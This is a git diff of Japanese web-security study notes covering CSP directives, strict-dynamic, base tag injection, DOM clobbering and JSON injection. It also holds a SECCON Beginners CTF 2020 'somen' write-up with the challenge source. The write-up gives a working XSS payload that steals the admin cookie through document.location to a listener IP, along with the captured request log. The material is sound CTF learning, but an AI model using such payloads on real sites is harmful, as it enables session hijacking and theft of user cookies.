@@ -2,11 +2,6 @@
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
-- [XSS](#xss)
-  - [CSP](#csp)
-    - [CSP Level](#csp-level)
-    - [script-src (level 2)](#script-src-level-2)
-    - [strict-dynamic (level 3)](#strict-dynamic-level-3)
 - [writeup](#writeup)
   - [Reflect / JSON Injection (CONFidence 2020 Teaser)](#reflect--json-injection-confidence-2020-teaser)
   - [](#)
@@ -63,18 +58,75 @@
 CSP Level 3の strict-dynamic をサポートしているブラウザでは nonce-{random} 'unsafe-eval' 'strict-dynamic' のみ解釈され、その他は無視される。   
 CSP Level 2までのみサポートしているブラウザでは 'nonce-{random}' 'unsafe-eval' のみ解釈され、その他は無視   
 CSP Level 1のみサポートしているブラウザでは 'unsafe-inline' 'unsafe-eval' https: http:; のみ解釈され、その他は無視   
+### default-src
+未指定の-srcディレクティブの大半に対してデフォルトを定義する。   
+デフォルトでインラインコードとeval()は有害とみなす   
+'unsafe-inline' もしくは 'unsafe-eval'で明示的に有効化する必要がある   
 
-### script-src (level 2)
+### script-src 
 ホワイトリストによって、jsファイルを読み込めるドメインを制限する。ただしコールバック関数を呼びだしできるJSONPエンドポイントを使用すればCSPをバイパスできるのでよくないらしい   
 https://inside.pixiv.blog/kobo/5137   
 https://csp-evaluator.withgoogle.com/   
 ここにCSPの設定を投げると、危険性を評価してくれる。超便利。   
-
+`'unsafe-inline'`がない限りはインラインスクリプトの実行を制限。   
+インラインスクリプトは`<script>`とか`<img onerro=alert>`とかのイベントハンドラ内のインラインとか。   
+https://qiita.com/zabu/items/d2fbac1abc81eba38efb   
+nonceはlevel2から存在する。nonceまたはホワイトリストがあれば実行を許可ってことかな？(strict-dynamicではnonceだけで許可)？   
 ### strict-dynamic (level 3)
 https://inside.pixiv.blog/kobo/5137   
 `'strict-dynamic'`によってnonceによるscriptの実行制御が強制される ( script-src にドメインのホワイトリストを書いても無視される)。   
 nonceにより実行を許可されたscriptから動的に生成された別のscriptも実行が許可されるようになる。   
+https://masatokinugawa.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html   
+non-"parser-inserted" なスクリプト要素は、スクリプトを使ってロードすることが許可される。   
+parser-insertedとはDocumentのパーサーが生成した（HTMLに書いてあった、もしくはdocument.writeで出力した）かどうか。   
+```js
+<script nonce="????">
+//これはロードされる
+var script=document.createElement('script');
+script.src='//example.org/dependency.js';
+document.body.appendChild(script);
+// <script id="aaa"></script>のような場合は実行可能
+document.getElementById("aaa").innerHTML = "alert(1);"
 
+//これはロードされない document.write()を使って書くとダメ
+document.write("<scr"+"ipt src='//example.org/dependency.js'></scr"+"ipt>");
+// <div id="aaa"></div>の場合はimgを挿入しても実行不可能
+document.getElementById("aaa").innerHTML = "<img src=/ onerror=alert(1)>"
+</script>
+```
+## Base Tag Injection
+以下を挿入すれば基底URLを変更できる。   
+```txt
+<base href="http://hoge.example">
+```
+CSPが設定されている場合は以下で検知できる。   
+https://csp-evaluator.withgoogle.com/   
+## DOM clobbering
+タグに同じid名を付与すれば、もともと`<div id="a">`に`document.getElementById("a").innerHTML`で代入していても、`<script id="a">`を挿入することでこっちにJavascriptを要素の値として挿入して実行できる！   
+- 参考   
+https://portswigger.net/web-security/dom-based/dom-clobbering   
+https://diary.shift-js.info/dom-clobbering/   
+- 例題   
+https://github.com/SECCON/Beginners_CTF_2020/blob/master/web/somen/writeup.md   
+https://masatokinugawa.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html   
+https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
+http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   
+
+## JSON Injection
+```js
+// この実装は脆弱！key1の値を上書きできる！
+dataStr = "value2', 'key1':'fake_value1";
+jsonStr = "{'key1':'value1', 'key2':'" + dataStr + "'}";
+console.log(jsonStr);  // {'key1':'value1', 'key2':'value2', 'key1':'fake_value1'}
+
+// こっちだとsecure???
+dataStr = "'value2', key1:'fake_value1'";
+temp_obj = {'key1':'value1', 'key2': dataStr};
+console.log(temp_obj); // { key1: 'value1', key2: "'value2', key1:'fake_value1'" }
+jsonStr = JSON.stringify(temp_obj);
+console.log(jsonStr);  // {"key1":"value1","key2":"'value2', key1:'fake_value1'"}
+```
+https://www.calc.mie.jp/posts/2017-12-26-json-injection.html   
 
 # writeup
 ## Reflect / JSON Injection (CONFidence 2020 Teaser)
@@ -196,23 +248,10 @@ kind=../
 kind=../templates/
 {"status": "ok", "content": ["index.html", "report.html", "flag.txt"]}
 ```
-- **JSON Injection**   
-```js
-// この実装は脆弱！key1の値を上書きできる！
-dataStr = "value2', 'key1':'fake_value1";
-jsonStr = "{'key1':'value1', 'key2':'" + dataStr + "'}";
-console.log(jsonStr);  // {'key1':'value1', 'key2':'value2', 'key1':'fake_value1'}
-
-// こっちだとsecure???
-dataStr = "'value2', key1:'fake_value1'";
-temp_obj = {'key1':'value1', 'key2': dataStr};
-console.log(temp_obj); // { key1: 'value1', key2: "'value2', key1:'fake_value1'" }
-jsonStr = JSON.stringify(temp_obj);
-console.log(jsonStr);  // {"key1":"value1","key2":"'value2', key1:'fake_value1'"}
-```
 ## 
 https://github.com/SECCON/Beginners_CTF_2020/blob/master/web/somen/writeup.md   
 https://www.ryotosaito.com/blog/?p=474   
+https://diary.shift-js.info/seccon-beginners-ctf-2020/   
 
 - **entrypoint**   
 `<title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>`にReflect XSSがあることがわかる。   
@@ -223,11 +262,151 @@ https://www.ryotosaito.com/blog/?p=474
 ```txt
 Content-Security-Policy: default-src 'none'; script-src 'nonce-WuUfK2ztXY/KcshKy90o8SGykbs=' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='
 ```
-したがって、nonceのセットされている元々ある`<script>`内でDOM basedにより任意のJavascriptを生成する必要があることがわかる。   
-nonceのある`<script>`から生成されるnonceのない`<script>`は実行権限が継承されて実行可能となる。   
+したがって、nonceのセットされている元々ある`<script>`内でDOM basedにより任意のJavascriptを生成する必要があることがわかる。ただし`.innerHTML`経由では`<script>`タグを挿入することはできない！！！！！！！！！！      
+nonceのある`<script>`から動的に生成されるnonceのない`<script>`は実行権限が継承されて実行可能となる。nonceのない`<script id="a">`に`document.getElementById("a").innerHTML` に値を代入する形とかなら継承される。     
 
 - **概要**   
+![image](https://user-images.githubusercontent.com/56021519/103155489-da447580-47e3-11eb-8fae-4406597cd176.png)   
+上のフォームから入力すると、JSに入力される。下のフォームから入力するとAdminが`/?username=test`みたいにアクセスしてくれる。   
+**index.php**   
+```php
+<?php
+$nonce = base64_encode(random_bytes(20));
+header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
+?>
+
+<head>
+    <title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>
+
+    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
+    <script nonce="<?= $nonce ?>">
+        const choice = l => l[Math.floor(Math.random() * l.length)];
+
+        window.onload = () => {
+            const username = new URL(location).searchParams.get("username");
+            const adjective = choice(["Nagashi", "Hiyashi"]);
+            if (username !== null)
+                document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
+        }
+    </script>
+</head>
+
+<body>
+    <h1>Best somen for You</h1>
+
+    <p>Please input your name. You can use only alphabets and digits.</p>
+    <p>This page works fine with latest Google Chrome / Chromium. We won't support other browsers :P</p>
+    <p id="message"></p>
+    <form action="/" method="GET">
+        <input type="text" name="username" place="Your name"></input>
+        <button type="submit">Ask</button>
+    </form>
+    <hr>
+
+    <p> If your name causes suspicious behavior, please tell me that from the following form. Admin will acceess /?username=${encodeURIComponent(your input)} and see what happens.</p>
+    <form action="/inquiry" method="POST">
+        <input type="text" name="username" place="Your name"></input>
+        <button type="submit">Ask</button>
+    </form>
+
+</body>
+```
+**worker.js**   
+これはGUI無しのブラウザみたいなのでNode.js上で動作する。`crawl`でAdminのCookieを保持した状態で、index.phpの下のフォームから入力されたusernameの値を使って`/?username=${encodeURIComponent(username)}`でアクセスしてくれる。   
+つまり、下のフォームからAdmin用のクローラに送信するusernameの値をなんやかんやしてXSSを発生されて攻撃者サーバーにCookieを送信させるのが目標。   
+```js
+const puppeteer = require('puppeteer');
+const Redis = require('ioredis');
+const connection = new Redis(6379, 'redis');
+
+const crawl = async (username) => {
+    // initialize
+    const browser = await puppeteer.launch({
+        executablePath: 'google-chrome-unstable',
+        headless: true,
+        args: [
+            '--no-sandbox',
+            '--disable-background-networking',
+            '--disk-cache-dir=/dev/null',
+            '--disable-default-apps',
+            '--disable-extensions',
+            '--disable-gpu',
+            '--disable-sync',
+            '--disable-translate',
+            '--hide-scrollbars',
+            '--metrics-recording-only',
+            '--mute-audio',
+            '--no-first-run',
+            '--safebrowsing-disable-auto-update',
+        ],
+    });
+    const page = await browser.newPage();
+
+    // set cookie
+    await page.setCookie({
+        name: 'flag',
+        value: process.env.FLAG,
+        domain: process.env.DOMAIN,
+        expires: Date.now() / 1000 + 10,
+    });
+
+    // access
+    const url = `${process.env.SCHEME}://${process.env.DOMAIN}/?username=${encodeURIComponent(username)}`;
+    try {
+        await page.goto(url, {
+            waitUntil: 'networkidle0',
+            timeout: 5000,
+        });
+    } catch (err) {
+        console.log(err);
+    }
+
+    // finalize
+    await page.close();
+    await browser.close();
+};
+
+(async () => {
+    while (true) {
+        console.log("[*] waiting new query ...");
+        await connection.blpop("query", 0).then(v => {
+            const username = v[1];
+            console.log(`[*] started: ${username}`);
+            return crawl(username);
+        }).then(() => {
+            console.log(`[*] finished.`)
+            return connection.incr("proceeded_count");
+        }).catch(e => {
+            console.log(e);
+        });
+    };
+})();
+```
+`document.getElementById("message").innerHTML`で`<p id="message"></p>`内に挿入される。   
+innerHTMLでは`<script>`を埋め込むことはできない。   
+https://ja.stackoverflow.com/questions/2756/innerhtml%E3%81%AB%E5%85%A5%E3%82%8C%E3%81%9F%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E4%B8%AD%E3%81%ABscript%E3%82%BF%E3%82%B0%E3%81%8C%E3%81%82%E3%81%A3%E3%81%A6%E3%82%82%E5%AE%9F%E8%A1%8C%E3%81%95%E3%82%8C%E3%81%AA%E3%81%84%E3%81%AE%E3%81%AF%E3%81%AA%E3%81%9C   
+しかし、`<script id="message">`を一つ目のReflected XSSで挿入すると、後ろの`<p id="message">`の代わりに挿入した`<script id="message">`にinnerHTMLに実行権限付きでJSが値として代入されてCSPをバイパスして実行できる！！？！？？！？   
+このように元々あるidと同じ名前のidを持つformとかscriptタグを挿入することで、挿入した方のタグが適応されてしまう手法をDOM clobberingというのかな？？   
+   
+
+また、`security.js`によって`username`パラメータの値には記号を含められないようになっているが、これはBase tag Injectionという`<base>`タグを挿入して基底URLを定義することでバイパスできる！   
+`<base href="http://hoge.example">`を挿入すれば、`src=/security.js`は`hoge.example/security.js`となってロードが失敗して制限をバイパスできる。   
+ちなみに、以下のCSP-Evaluatorを使用すればBase tag Injectionできることがわかる！   
+https://csp-evaluator.withgoogle.com/   
+![image](https://user-images.githubusercontent.com/56021519/103156841-63fa4000-47f0-11eb-9663-e71256d876f2.png)   
 - **Payload**   
+Docker環境ではIPアドレスが到達できなかったりするので、worker.jsを編集して`192.168.99.100`とかを直書きしている。   
+```txt
+// これを下のフォームのAdminクローラにPOSTする
+document.location=`http://192.168.99.1:4444/?q=${encodeURIComponent(document.cookie)}`;//</title><script id="message"></script><base href="http://hoge.example">
+
+// WSLでListenする
+192.168.99.100 - - [26/Dec/2020 21:41:56] "GET /?q=flag%3Dtest%7Bflag%7D HTTP/1.1" 200 -
+```
+- **ほぼ同じ類題**   
+https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3#Case-23-nonce--strict-dynamic   
+http://akouryy.hatenablog.jp/entry/ctf/xss.shift-js.info#23-   
+
 ## 
 - **entrypoint**   
 - **概要**   
